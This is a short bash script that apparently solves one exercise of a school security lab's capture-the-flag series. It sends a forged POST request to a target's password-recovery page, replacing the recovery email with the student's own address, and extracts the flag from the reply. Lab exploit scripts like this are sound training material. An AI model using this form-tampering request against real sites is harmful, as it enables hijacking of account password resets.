#!/bin/bash
#
# ./get-the-recover-mail-flag.sh "ip"
# 

function simplified_curl_request
{
	# $1:	url/ip to test
	# $2:	queries string to test (those one which from SQL injection, pass all
	#		query string by url ($1)
	curl -sG --data-urlencode "${2}" "${1}" 
	return $?
}

theme="recovering mail via forgery HTTP request"

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

echo -e "\n\033[35m9. === ${theme} ===============================================\033[0m\n"

echo -e "We want to change the value of the email used for recovering password: \033[33mwebmaster@borntosec.com\033[0m for \033[33malellouc@student.42nice.fr\033[0m"
flag=`curl -vLs --post301  --data-urlencode "Submit=Submit" --data-urlencode "mail=alellouc@student.42nice.fr" "${1}/?page=recover" | grep -Eo "The flag is : [a-zA-Z0-9]*" | awk '{print $NF}'`
echo -e "Flag earned with recovering mail injection: \033[31m${flag}\033[0m"
echo -e "\n\$\$\$ ${theme} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
